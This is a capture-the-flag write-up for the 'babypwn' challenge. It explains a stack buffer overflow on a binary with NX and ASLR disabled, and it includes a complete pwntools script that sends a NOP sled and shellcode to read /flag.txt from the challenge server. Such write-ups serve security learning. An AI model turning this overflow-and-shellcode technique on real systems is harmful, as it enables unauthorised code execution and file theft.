# babypwn

Points: 100

```bash
➜ checksec babypwn
[*] '/home/squishy/Programs/ctf/2020/cyber_security_rumble/babypwn/baby-pwn-for-download/docker/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

The only protection we have is that PIE enabled. Note that NX is disabled.
Also, we can see from the `babypwn_svc` that ASLR is disabled.

I started by trying to exploit it on the local executable:

To turn off ASLR:
```
➜ setarch `uname -m` -R $SHELL
```

This spawns a shell where any subsequence commands with have ASLR disabled as
well. Note that running a program in gdb disables ASLR by default.

By overflowing `user_md5`, I was eventually able to execute my shellcode payload
on the stack. I tested this and found that it worked by stepping through the
program in GDB.

However, when I actually ran the program, I found that it didn't work. This
was because for some reason, the stack offset was different from when I ran it
in GDB. I was able to confirm this by inspecting core files caused by the crash.

I then corrected the stack offset by using the address from the core file. This
allowed it to work when running the local executable. However, it failed when
running on my local containerized challenge as well as the remote challenge.

It seems like:
- With ASLR disabled, the stack addresses will not be deliberately randomized
  between each run. This allowed my exploit to work locally with ASLR disabled.
- With PIE enabled, the stack address will change depending on the context.
  - When running in GDB, I got different stack addresses
  - When running locally, I got different stack addresses
  - When running from the containerized challenge, I got different stack addresses

Since we don't know the stack addresses on the containerized challenge, we can
only guess. To increase the chances of a successful guess, we can precede our
shellcode with a generous amount of no-ops. Then we just try different stack
address until it works.

Script (also in `main_cat_clean.py`):
```python
import pwn

pwn.context.arch = 'amd64'

sh = pwn.remote('chal.cybersecurityrumble.de', 1990)


def inject_shellcode():
    # Target: 120 bytes
    # 8 bytes: (fake input)
    # 1 byte: (null to fool strlen)
    # 111 bytes: (padding)
    # ---
    # 8 bytes: address somewhere in no-ops to reach shellcode
    # ---
    # ? bytes: (no ops) <- Goal is to jump somewhere here
    # ? bytes: (shellcode)

    ret_addr_padding = 120

    payload = b'12345678' + b'\0';

    padding = ret_addr_padding - len(payload)
    payload += pwn.cyclic(padding)

    # Keep guessing values until this works.
    # You can use `➜ sudo dmesg | tail -10` to see info on where the program
    # failed.
    sh_code_addr = 0x7fffffffef90 # lucky guess

    print('sh_code_addr: ', hex(sh_code_addr))
    payload += pwn.p64(sh_code_addr)

    payload += pwn.asm(pwn.shellcraft.nop()) * 2048

    # Since we are using `gets`, `stdin` mustbe re-opened if we want to use it
    # Instead let's just `cat` the file
    sh_code = pwn.shellcraft.amd64.linux.cat('/flag.txt')
    sh_code += pwn.shellcraft.exit(0)

    sh_code = pwn.asm(sh_code)
    sh_code = pwn.encoder.line(sh_code)

    payload += sh_code
    print('Payload len: ', len(payload))

    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
sh.interactive() # Hit enter to show the output of `cat /flag.txt`
```
